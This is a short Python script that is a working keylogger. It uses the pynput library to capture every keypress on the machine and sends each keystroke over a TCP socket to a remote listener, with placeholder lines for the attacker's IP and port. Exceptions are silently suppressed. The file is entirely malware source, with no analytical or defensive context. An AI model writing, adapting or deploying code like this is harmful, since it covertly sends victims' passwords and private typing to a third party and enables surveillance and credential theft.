import socket
from pynput import keyboard


IP_ADDRESS = "192.168.1.100"  # ip goes here
PORT = 4444  # port goes here

def send_key(key):
    try:
        
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((IP_ADDRESS, PORT))
        
       
        s.send(str(key).encode())
        
        s.close()
    except:
        pass  

def on_press(key):
    send_key(key)


with keyboard.Listener(on_press=on_press) as listener:
    listener.join()
